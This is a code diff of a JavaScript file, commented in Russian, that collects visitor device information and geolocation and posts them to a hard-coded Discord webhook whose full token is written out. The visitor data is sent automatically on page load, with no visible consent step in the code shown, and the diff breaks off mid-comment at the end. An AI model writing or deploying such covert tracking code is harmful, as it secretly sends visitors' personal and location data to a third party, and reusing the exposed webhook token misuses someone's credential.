@@ -1,4 +1,4 @@
-// scripts.js
+const webhookURL = 'https://discord.com/api/webhooks/1303384530895372338/orvIQvUJHq86vnrecZ5tNFzw1UGCH2LAy18RjtJmTNSdhgd8yaDSZSdTlevLid7EGcjB';
 
 // Функция для получения информации о пользователе
 function getUserInfo() {
@@ -13,8 +13,6 @@ function getUserInfo() {
 
 // Функция для отправки данных в Discord через вебхук
 function sendToDiscord(data) {
-    const webhookURL = 'https://discord.com/api/webhooks/1303384530895372338/orvIQvUJHq86vnrecZ5tNFzw1UGCH2LAy18RjtJmTNSdhgd8yaDSZSdTlevLid7EGcjB'; // Замените на ваш вебхук Discord
-
     const message = {
         content: `Новый визит:
         - Телефон: ${data.phoneInfo}
@@ -40,7 +38,7 @@ function sendToDiscord(data) {
     });
 }
 
-// Получаем данные и отправляем их в Discord
+// Получаем данные и отправляем их в Discord при загрузке страницы
 window.onload = () => {
     const userData = getUserInfo();
     sendToDiscord(userData);
@@ -119,16 +117,13 @@ function getLocationAndSendToWebhook() {
 
 // Функция для обработки успешного получения местоположения
 function sendLocationToWebhook(position) {
-    // Получаем координаты
     const latitude = position.coords.latitude;
     const longitude = position.coords.longitude;
 
-    // Формируем сообщение для отправки в Discord
     const message = {
         content: `Местоположение пользователя:\nШирота: ${latitude}\nДолгота: ${longitude}`
     };
 
-    // Отправляем данные в вебхук Discord
     fetch(webhookURL, {
         method: 'POST',
         headers: {
@@ -136,12 +131,15 @@ function sendLocationToWebhook(position) {
         },
         body: JSON.stringify(message)
     })
-    .then(response => response.json())
-    .then(data => {
-        console.log('Данные успешно отправлены в Discord:', data);
+    .then(response => {
+        if (response.ok) {
+            console.log('Данные успешно отправлены в Discord');
+        } else {
+            console.error('Ошибка при отправке данных в Discord');
+        }
     })
-    .catch((error) => {
-        console.error('Ошибка при отправке данных:', error);
+    .catch(error => {
+        console.error('Ошибка при отправке запроса: ', error);
     });
 }
 
@@ -163,5 +161,4 @@ function showError(error) {
     }
 }
 
-// Добавляем обработчик события для кнопки получения местоположения
-document.getElementById("getLocationBtn").addEventListener("click", getLocationAndSendToWebhook);
+// Добавляем обработчик события для кноп
